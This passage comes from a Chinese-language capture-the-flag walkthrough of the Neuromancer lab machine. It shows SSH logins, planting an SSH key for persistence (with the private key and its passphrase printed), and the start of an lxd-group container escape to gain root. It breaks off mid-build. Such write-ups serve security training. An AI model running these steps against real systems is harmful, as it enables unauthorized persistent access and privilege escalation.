<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh -p 34483 lady3jane@192.168.56.110</span></span><br><span class="line"> ----------------------------------------------------------------</span><br><span class="line">|                Neuromancer Secure Remote Access                |</span><br><span class="line">| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |</span><br><span class="line"> ----------------------------------------------------------------</span><br><span class="line">lady3jane@192.168.56.110<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">94 packages can be updated.</span></span><br><span class="line"><span class="string">44 updates are security updates.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Wed Jan 15 23:19:59 2020 from 192.168.56.102</span></span><br><span class="line"><span class="string">lady3jane@neuromancer:~$ </span></span><br><span class="line"><span class="string">lady3jane@neuromancer:~$ id</span></span><br><span class="line"><span class="string">uid=1001(lady3jane) gid=1001(lady3jane) groups=1001(lady3jane)</span></span><br><span class="line"><span class="string">lady3jane@neuromancer:~$ whoami</span></span><br><span class="line"><span class="string">lady3jane</span></span><br><span class="line"><span class="string">lady3jane@neuromancer:~$ dir</span></span><br><span class="line"><span class="string">44298  custom-tomcat-chk.sh</span></span><br><span class="line"><span class="string">lady3jane@neuromancer:~$ pwd</span></span><br><span class="line"><span class="string">/home/lady3jane</span></span><br></pre></td></tr></table></figure>

<p>但是很遗憾，它不是任何管理员，也没有任何sudo功能：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lady3jane@neuromancer:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> lady3jane: </span><br><span class="line">Sorry, user lady3jane may not run sudo on neuromancer.</span><br></pre></td></tr></table></figure>

<p>假设“ta”帐户提到了“group”命令的某些管理功能，让我们尝试一下“ta”帐户的可能性</p>
<h2 id="步骤3：获得TTY-“ta”帐户的SSH密钥路由"><a href="#步骤3：获得TTY-“ta”帐户的SSH密钥路由" class="headerlink" title="步骤3：获得TTY-“ta”帐户的SSH密钥路由"></a>步骤3：获得TTY-“ta”帐户的SSH密钥路由</h2><p>生成密钥集的过程非常简单：</p>
<ul>
<li>cd into &#x2F;home&#x2F;ta</li>
<li>运行ssh-keygen。遵循所有默认设置，但选择应用密码短语。密钥存储在&#x2F;home&#x2F;ta&#x2F;.ssh中</li>
<li>将公钥添加到&#x2F;home&#x2F;ta&#x2F;.ssh&#x2F;authorized_keys文件</li>
<li>找出id_rsa和id_rsa.pub的值，然后将其复制&#x2F;粘贴到我的攻击box中的相应文件中。还将chmod 400应用于每个文件，否则ssh会抱怨权限，然后完全忽略密钥，这将导致出现不需要的密码提示（我们不知道密码！）</li>
</ul>
<p>生成密钥并将副本放入攻击box中后，即可获得访问权限：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">whoami</span></span><br><span class="line">ta</span><br><span class="line">$ <span class="built_in">mkdir</span> .ssh</span><br><span class="line">$ <span class="built_in">ls</span> -la</span><br><span class="line">total 60</span><br><span class="line">drwxr-xr-x 7 ta   ta   4096 Jan 18 20:57 .</span><br><span class="line">drwxr-xr-x 4 root root 4096 Jul  1  2018 ..</span><br><span class="line">-rw-rw-r-- 1 ta   ta    352 Jul  1  2018 ai-gui-guide.txt</span><br><span class="line">-rw------- 1 ta   ta     54 Jul  3  2018 .bash_history</span><br><span class="line">-rw-r--r-- 1 ta   ta    220 May 18  2018 .bash_logout</span><br><span class="line">-rw-r--r-- 1 ta   ta   3900 May 18  2018 .bashrc</span><br><span class="line">drwx------ 2 ta   ta   4096 May 18  2018 .cache</span><br><span class="line">drwxrwxr-x 3 ta   ta   4096 May 18  2018 .m2</span><br><span class="line">drwxrwxr-x 4 ta   ta   4096 May 18  2018 myWebApp</span><br><span class="line">drwxrwxr-x 2 ta   ta   4096 May 18  2018 .oracle_jre_usage</span><br><span class="line">-rw-r--r-- 1 ta   ta    655 May 18  2018 .profile</span><br><span class="line">drwxr-x--- 2 ta   ta   4096 Jan 18 20:57 .ssh</span><br><span class="line">-rw-r----- 1 ta   ta     82 May 18  2018 velocity.log</span><br><span class="line">-rw------- 1 ta   ta   4538 Jul  1  2018 .viminfo</span><br><span class="line">$ <span class="built_in">cd</span> .ssh</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">$ ssh-keygen</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/home/ta/.ssh/id_rsa): </span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase): 123456</span><br><span class="line">Enter same passphrase again: 123456</span><br><span class="line">Your identification has been saved <span class="keyword">in</span> /home/ta/.ssh/id_rsa.</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> /home/ta/.ssh/id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:/gzcDUYz+IUYLOPtla+IXjSlx8Mmfc9cHvH0794Ptys ta@neuromancer</span><br><span class="line">The key<span class="string">&#x27;s randomart image is:</span></span><br><span class="line"><span class="string">+---[RSA 2048]----+</span></span><br><span class="line"><span class="string">|       ..        |</span></span><br><span class="line"><span class="string">|      o .+ .     |</span></span><br><span class="line"><span class="string">|     . +o *..  ..|</span></span><br><span class="line"><span class="string">|      . .Oo+   .+|</span></span><br><span class="line"><span class="string">|       .S.@..  .+|</span></span><br><span class="line"><span class="string">|       +.B =.+ oo|</span></span><br><span class="line"><span class="string">|       .=.... = +|</span></span><br><span class="line"><span class="string">|      ...+.  E +o|</span></span><br><span class="line"><span class="string">|     ..   o   .+B|</span></span><br><span class="line"><span class="string">+----[SHA256]-----+</span></span><br><span class="line"><span class="string">$ ls -la</span></span><br><span class="line"><span class="string">total 16</span></span><br><span class="line"><span class="string">drwxr-x--- 2 ta ta 4096 Jan 18 21:00 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 7 ta ta 4096 Jan 18 20:57 ..</span></span><br><span class="line"><span class="string">-rw------- 1 ta ta 1766 Jan 18 21:00 id_rsa</span></span><br><span class="line"><span class="string">-rw-r----- 1 ta ta  396 Jan 18 21:00 id_rsa.pub</span></span><br><span class="line"><span class="string">$ cp id_rsa.pub authorized_keys</span></span><br><span class="line"><span class="string">$ ls </span></span><br><span class="line"><span class="string">authorized_keys</span></span><br><span class="line"><span class="string">id_rsa</span></span><br><span class="line"><span class="string">id_rsa.pub</span></span><br><span class="line"><span class="string">$ chmod 400 *</span></span><br><span class="line"><span class="string">$ cat authorized_keys</span></span><br><span class="line"><span class="string">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpcLl+QjOHvGDqQ9ZPsgT8Rm9VbuZsa0JtUsE59C5feBNUC0uuOME6JSSY+Ci5fXnanOJIFKcNbRnfz0eQ35/FlCQE6TqXW08LROeaz+scppXs9O7wMNkmVrtrjHMIfebEtB9I05DWPpme5GjHE9QerNjE4t8Z6khoqipeQAy2VqYmqU5u8ll2gm3VDNhgUnfGeBwUoQA2Ktj1F9XMaBVgRBytZ86VLW1Be4SLd6rkMhgA/poZQSZGjU1di09Y9VnN/au+PgQQvVvldP2WITAfS4j0rTTF9zz8o+kccWll/CkMjoOBAJB06KBqxg1dnGcMXyEUnTshFidXx2TjBQQx ta@neuromancer</span></span><br><span class="line"><span class="string">$ cat id_rsa.pub</span></span><br><span class="line"><span class="string">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpcLl+QjOHvGDqQ9ZPsgT8Rm9VbuZsa0JtUsE59C5feBNUC0uuOME6JSSY+Ci5fXnanOJIFKcNbRnfz0eQ35/FlCQE6TqXW08LROeaz+scppXs9O7wMNkmVrtrjHMIfebEtB9I05DWPpme5GjHE9QerNjE4t8Z6khoqipeQAy2VqYmqU5u8ll2gm3VDNhgUnfGeBwUoQA2Ktj1F9XMaBVgRBytZ86VLW1Be4SLd6rkMhgA/poZQSZGjU1di09Y9VnN/au+PgQQvVvldP2WITAfS4j0rTTF9zz8o+kccWll/CkMjoOBAJB06KBqxg1dnGcMXyEUnTshFidXx2TjBQQx ta@neuromancer</span></span><br><span class="line"><span class="string">$ cat id_rsa</span></span><br><span class="line"><span class="string">-----BEGIN RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">Proc-Type: 4,ENCRYPTED</span></span><br><span class="line"><span class="string">DEK-Info: AES-128-CBC,0A0CA4D74B1C05FCDEC9F8FAE18EFB6D</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">w38r/TLFNRXJBCI/BpIUgQcmqZ8tcIyIaOg5gOhBLoKgLhmQ1ghMtBghR/Uu3hY8</span></span><br><span class="line"><span class="string">16Wk4Vk64miWibaNYG4aVz0XOK4Zi6u3slp8KHMZm5OARsnLRfWdBck/VSzqmv0z</span></span><br><span class="line"><span class="string">uI1yl0E3jJyfA+Xlxra9lxKzSi5g4Qw64q22tJzC9bNktAbVCNaV795K7m0TJaXl</span></span><br><span class="line"><span class="string">5SzB6+jagE96PjwT169VyJxX0IpVHIEeVZfkO3QD9e2mcJLgassz3fG+YlU6vQVV</span></span><br><span class="line"><span class="string">O4IZnXu/pPjYSFeLyVwcasHsgWsxqRsPne7J88l8gBVFswFjLVnCLW55i14le1bk</span></span><br><span class="line"><span class="string">82/BHH+3Y6zAkjueFA4/ggFKKU0kRlXQXdFMNhxH9gc3+gANeIK+qXfypx2+3keC</span></span><br><span class="line"><span class="string">d6wplIaFtzt9npQh3vJnXPF4l6dWCOYAK8FqoGgcbB8qDOz5/j1qxHHo3P8mWyVP</span></span><br><span class="line"><span class="string">X0wK7UzwBg8nIe3JjKtFPfSpgiNtNGai5GCvJlt7c9Wtxd1HcIFcUrCDeAb9ijMm</span></span><br><span class="line"><span class="string">zzTLNdkae/677ErzfQfEeA24u21DyQoIP0MUM0ICa3Qjr5uXa1RnNq38pYfi338X</span></span><br><span class="line"><span class="string">kKwHqJQCxm43HLoQIoMQIRYTN49W3wLMdnH7oF40nT6ktJuC9zlzilV+JxcRODgc</span></span><br><span class="line"><span class="string">eUFoKag5y2/wR8yeLeUiDgxUzL441ThkYGa2jaULRoVehDgAUXrQEEkzY/OM8/G1</span></span><br><span class="line"><span class="string">50MJAMEKJU17TDjTtjIy6ymtKPTxohezKvBwjgQmR6eGin32i6iIs38jag8jqape</span></span><br><span class="line"><span class="string">0MIRzOO3gfod8FXaJMp282gebGhLwWeowjogzfyKQzwIQxkldVVOO1caJWuBczNd</span></span><br><span class="line"><span class="string">JMKT7F1zoClpEg9YFyPMnkQtoNwjuGs6KtFgpt5yz/8j5jy0uiSaiLlvrOYtDDli</span></span><br><span class="line"><span class="string">0AEjTlDPbzEQgKhdjdwiPm0ClJoXHIgg35mjwTwfxmFvNL2XJlunm2fDcooDbM3o</span></span><br><span class="line"><span class="string">2KIzsa5kFEFbvPkP1Cym4RrTRkXv55XfRZHBk5/DBICmez6pkaC1A+W0vfyTX70z</span></span><br><span class="line"><span class="string">wJrvoUHdENdQIHESb8hrAmqZXjSNsBB1WEKHcN39v/iufxMMk0Dei2Ca5VgTfyfB</span></span><br><span class="line"><span class="string">lwtrdtV3YPhNT4v+2FhibKIaILIVS0oWU9IAzAHNPMt+GFXo3QRtFJmprJc8AVzf</span></span><br><span class="line"><span class="string">3guFhYesZZVmzNRDcuhZuQmY54YaCc0VFEBLwoaIn5Y33zPO274IICw0IXzm4Nmm</span></span><br><span class="line"><span class="string">QttHWLl9IcbVVOkkmnuvNcKZ8kdcZ24zZGXD+2bV/+VQHFanSXjEDdzeYDUjRiiK</span></span><br><span class="line"><span class="string">va7jEa8wb5/mHOJFRTeYBiuLY1H239HedvycPRfHyA1Hq3q3+7c1JJVxiVdOr3zO</span></span><br><span class="line"><span class="string">gM22fIaExHxjRdf0L06sht1SC9Le4d6oc5mhFjmk4h+DyorOyWuaC8xBUatE+slF</span></span><br><span class="line"><span class="string">OxerKC2CdDFCrx9+8jQmix0KSfePhYC4loiQ+tS6Bp8YtiOGOmlZ+2sCa0wf7inN</span></span><br><span class="line"><span class="string">sOLukUtHENuU720fPxEurnbCDG4QKk4Szvea61UkOrEF15x0PO42YSCz7QtHdLeG</span></span><br><span class="line"><span class="string">hiHhVK28l9FeRekPEdOUou1tjiiVvEUUNi99YJsOroTNfiHy6RjmcA+BWFOIfHrY</span></span><br><span class="line"><span class="string">-----END RSA PRIVATE KEY-----</span></span><br></pre></td></tr></table></figure>

<p>kali端运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cd .ssh</span></span><br><span class="line">root@kali:~/.ssh<span class="comment"># ls</span></span><br><span class="line">known_hosts</span><br><span class="line">root@kali:~/.ssh<span class="comment"># touch id_rsa</span></span><br><span class="line">root@kali:~/.ssh<span class="comment"># nano id_rsa (将ta用户中的id_rsa中的值拷贝进来)</span></span><br><span class="line">root@kali:~/.ssh<span class="comment"># chmod 400 *</span></span><br></pre></td></tr></table></figure>

<p>ssh连接，输入密码123456</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh -i /root/.ssh/id_rsa -p 34483 ta@192.168.56.110</span></span><br><span class="line"> ----------------------------------------------------------------</span><br><span class="line">|                Neuromancer Secure Remote Access                |</span><br><span class="line">| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |</span><br><span class="line"> ----------------------------------------------------------------</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;/root/.ssh/id_rsa&#x27;</span>: </span><br><span class="line">Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">94 packages can be updated.</span><br><span class="line">44 updates are security updates.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Tue Jul  3 21:53:25 2018</span><br><span class="line">ta@neuromancer:~$ <span class="built_in">id</span></span><br><span class="line">uid=1000(ta) gid=1000(ta) <span class="built_in">groups</span>=1000(ta),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)</span><br><span class="line">ta@neuromancer:~$ <span class="built_in">whoami</span></span><br><span class="line">ta</span><br></pre></td></tr></table></figure>

<p><font color="red">it works!!!!!!</font></p>
<p>再次执行“groups”命令，然后一分钱掉了……。“ta”不是“admin”组的成员，因此不会成为root用户的即时路径：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ta@neuromancer:~$ <span class="built_in">groups</span></span><br><span class="line">ta adm cdrom dip plugdev lxd lpadmin sambashare</span><br></pre></td></tr></table></figure>

<p>向前迈进…现在没有真正的意义跳到通过socat选项获得TTY…</p>
<p>当试图root时，通常如下进行：</p>
<ul>
<li>sudo</li>
<li>password</li>
<li>file permissions (suid&#x2F;guid)</li>
<li>cron作业（通常与错误的文件权限结合使用）</li>
<li>内核漏洞</li>
<li>正在运行的应用程序</li>
<li>文件系统</li>
</ul>
<p>通常，将该列表下移得越远，privesc就越困难。因此，……在用完前两个选项之后，需要进行一些老式枚举。<br>经过一系列的提权的枚举之后，发现了提权1步骤中的提权的exp，44298.c，，，但是……总会有一个“but”！:-)</p>
<h2 id="步骤4：选择提权利用途径"><a href="#步骤4：选择提权利用途径" class="headerlink" title="步骤4：选择提权利用途径"></a>步骤4：选择提权利用途径</h2><p>有许多出色的可用于此计算机的编写，并且毫无例外，它们都采用内核利用选项，因为很正确的选择是最明显的选择。如果需要在检查场景中快速root箱子，那么当然会选择最明显的路线。</p>
<p>除了必须在攻击盒上编译漏洞利用程序（Neuromancer未安装gcc）外，这是一个非常快捷简便的选择。但是抛开任何与CTF&#x2F;OSCP相关的内容……。在“现实世界”中，可以用来处理关键任务的生产系统呢？内核漏洞可能会使生产箱失效，而根本就不想危及下一步入侵！</p>
<p>但是，还有另一种方法可以使此box成为root，我不禁感到“杂技演员”（机器作者）可能希望将其作为另一种待发现的选择。尽管它可能会吸引蓝团队的注意，但它不太可能引起内核崩溃。那我在说什么呢？可以在以下简单命令中找到线索，以检查“ta”所属的组：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ta@neuromancer:~$ <span class="built_in">groups</span></span><br><span class="line">ta adm cdrom dip plugdev lxd lpadmin sambashare</span><br></pre></td></tr></table></figure>

<p>看到是对lxd的引用,这是Ubunutu的容器技术-Docker的替代方法,我做了一些研究，发现“Booj”写的一篇很棒的文章叫做<span class="exturl" data-url="aHR0cHM6Ly9yZWJvYXJlLmdpdGh1Yi5pby9seGQvbHhkLWVzY2FwZS5odG1s">Privilege Escalation via lxd<i class="fa fa-external-link-alt"></i></span>,根据本文所述，如果安装了lxd且给定用户是lxd组的成员，则它们具有与使用以下命令添加到&#x2F;etc&#x2F;sudoers相同的权限：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin ALL=NOPASSWD: ALL</span><br></pre></td></tr></table></figure>

<p>因此，…使用此选项非常忙。</p>
<h2 id="步骤5：准备和使用容器-概述"><a href="#步骤5：准备和使用容器-概述" class="headerlink" title="步骤5：准备和使用容器-概述"></a>步骤5：准备和使用容器-概述</h2><p>我不会深入探讨与创建基于Ubuntu LXC的容器相关的每个小细节。这将在另一篇文章中发表，因为这是一个引人入胜的主题，值得深入探讨，而不是本文讨论的范围。</p>
<p>简而言之，这项工作涉及以下方面：</p>
<ul>
<li>根据获取的信息，设置一个尽可能接近Neuromancer的VM。因此，那将是Ubuntu 16.04。</li>
<li>在新创建的VM上安装lxd。</li>
<li>再次创建一个容器，基于Ubuntu 16.04。我只是想让事情简单一点，就我应该做的最好的猜测。</li>
<li>将该容器导出为tarball并将其转移到我的攻击box中，然后再将其转移到Neuromancer box中。由于先前实现了SOCAT端口转发，因此可以通过scp进行传输。</li>
</ul>
<p>为了清楚起见……在任何时候，都没有允许攻击box位于与Neuromancer相同的物理子网中作弊。所有这些都必须以“艰苦”的方式完成。我应该怎么学？</p>
<ul>
<li>导入lxd容器映像tarball并使其能够安装主机文件系统（是的，Neuromancer！）</li>
<li>在新创建的容器上获得root bash会话并创建一组SSH密钥，这些密钥将被写入Neuromancer上的&#x2F;root&#x2F;.ssh（通过容器中的&#x2F;mnt&#x2F;root&#x2F;root&#x2F;.ssh），并添加公共Neuromancer主机上&#x2F;root&#x2F;.ssh&#x2F;authorized_keys的密钥（通过容器中的&#x2F;mnt&#x2F;root&#x2F;root&#x2F;.ssh）</li>
<li>将SSH密钥的副本传输到我的攻击Kali中，然后以root用户身份登录（希望如此）。</li>
</ul>
<p>上面的内容很雄心勃勃，但是值得这么做，特别是如果唯一的选择是危险的内核漏洞利用。为了简洁，将重点放在刚刚将容器tarball转移到Neuromancer主机上的那一点上。系好安全带，享受旅程吧！:-)</p>
<h2 id="步骤6-导入容器映像。"><a href="#步骤6-导入容器映像。" class="headerlink" title="步骤6-导入容器映像。"></a>步骤6-导入容器映像。</h2><p>kali端攻击机运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ta@neuromancer:~$ <span class="built_in">uname</span> -a</span><br><span class="line">Linux neuromancer 4.4.0-116-generic <span class="comment">#140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">ta@neuromancer:~$ <span class="built_in">cat</span> /proc/version</span><br><span class="line">Linux version 4.4.0-116-generic (buildd@lgw01-amd64-021) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.9) ) <span class="comment">#140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018</span></span><br></pre></td></tr></table></figure>

<p>可以看出是64位的linux</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># git clone https://github.com/saghul/lxd-alpine-builder</span></span><br><span class="line">正克隆到 <span class="string">&#x27;lxd-alpine-builder&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 27, <span class="keyword">done</span>.</span><br><span class="line">remote: Total 27 (delta 0), reused 0 (delta 0), pack-reused 27</span><br><span class="line">展开对象中: 100% (27/27), 完成.</span><br><span class="line">root@kali:~<span class="comment"># cd lxd-alpine-builder/</span></span><br><span class="line">root@kali:~/lxd-alpine-builder<span class="comment"># ls</span></span><br><span class="line">build-alpine  LICENSE  README.md</span><br><span class="line">root@kali:~/lxd-alpine-builder<span class="comment"># chmod 777 *</span></span><br><span class="line">root@kali:~/lxd-alpine-builder<span class="comment"># ls</span></span><br><span class="line">build-alpine  LICENSE  README.md</span><br><span class="line">root@kali:~/lxd-alpine-builder<span class="comment"># proxychains ./build-alpine -a x86_64</span></span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">Determining the latest release... |DNS-request| dl-cdn.alpinelinux.org </span><br><span class="line">|D-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|DNS-response| dl-cdn.alpinelinux.org is 151.101.40.249</span><br><span class="line">|D-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-151.101.40.249:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">v3.11</span><br><span class="line">Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.11/main/x86_64</span><br><span class="line">|DNS-request| dl-cdn.alpinelinux.org </span><br><span class="line">|D-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|DNS-response| dl-cdn.alpinelinux.org is 151.101.40.249</span><br><span class="line">|D-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-151.101.40.249:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">Downloading alpine-mirrors-3.5.10-r0.apk</span><br><span class="line">|DNS-request| dl-cdn.alpinelinux.org </span><br><span class="line">|D-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|DNS-response| dl-cdn.alpinelinux.org is 151.101.40.249</span><br><span class="line">|D-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-151.101.40.249:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">Downloading alpine-keys-2.1-r2.apk</span><br><span class="line">|DNS-request| dl-cdn.alpinelinux.org </span><br><span class="line">|D-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|DNS-response| dl-cdn.alpinelinux.org is 151.101.40.249</span><br><span class="line">|D-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-151.101.40.249:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 